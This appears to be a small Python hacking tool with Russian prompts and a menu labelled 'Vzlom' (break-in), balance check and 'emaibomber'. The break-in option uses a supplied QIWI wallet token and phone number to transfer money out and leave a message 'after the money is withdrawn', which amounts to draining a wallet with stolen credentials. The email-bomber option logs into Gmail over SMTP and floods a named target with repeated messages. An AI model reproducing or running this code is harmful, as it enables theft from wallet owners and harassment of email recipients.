string_list = []
num_list = []
from SimpleQIWI import *
import vk, urllib.request, urllib.error, urllib.parse, json, random, time, sys, threading, smtplib, time
def main():
    cmd = input("Введите команду help: ")
    while cmd != "4":
        if cmd == "1":
            inpStr()
        elif cmd == "3":
            inpNum()
        elif cmd == "2":
            inpCmd()
        elif cmd == "help":
           help()
        else:
            print("Такой команды несуществует!")
        cmd = input("Введите команду: ")
    return
 
def inpStr():
	log ='''
	###############(Version:0.2################
	                Author                   
	                APNEM19 				    
		 	/vk.com/i123123123123			
	###########################################
	'''
	print (log);
	token=input('Enter api token: ')
	phone=input('Enter phone: ')
	num=input('Введите номер куда будет перевод +7: ');
	amount=input('Введите Сумму: ');
	SMS=input('Введите сообщение которое будет оставленно после снятия денег: ')
	#=====================api================================|
	api = QApi(token=token, phone=phone)
	print('Проверен')
	print(api.balance)
	api.pay(account=num, amount=amount, comment=SMS)
	print(api.balance)
	input()
	#========================================================|
def inpNum():
 print("(author apnem19)")
 sender_email = input("Enter your email id: ")
 password = input("Enter your password: ")
 rec_email = input("Enter the target's email id: ") 
 message = input("Enter a message for your target\n \n")
 bombsize = input("Enter the bomb size (default - 25): ")
 print(bombsize)
 i = 0
 agree = input("Are you sure please y: ") 
 if agree.lower() == 'y':
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(sender_email,password)
    print(" [ + ]Authenticating........")
    print(f"{bombsize} 💣 have been launched ")
    while i != int(bombsize):
        server.sendmail(sender_email, rec_email, message)
        print(f"{i+1} Bomb 💥")
        i += 1
 else:
    exit();
 
def inpCmd():
	#=======================system===========================|
	token=input('Enter token: ')
	phone=input('Enter phone: ');
	api = QApi(token=token, phone=phone)
	print('Проверен')
	print(api.balance)
	input();
def help():
	print ("(.1.) Vzlom");
	print ("(.2.) Balance");
	print ("(.3.) emaibomber");
	print ("(.4.) Exit");
def hac():
 pass


main()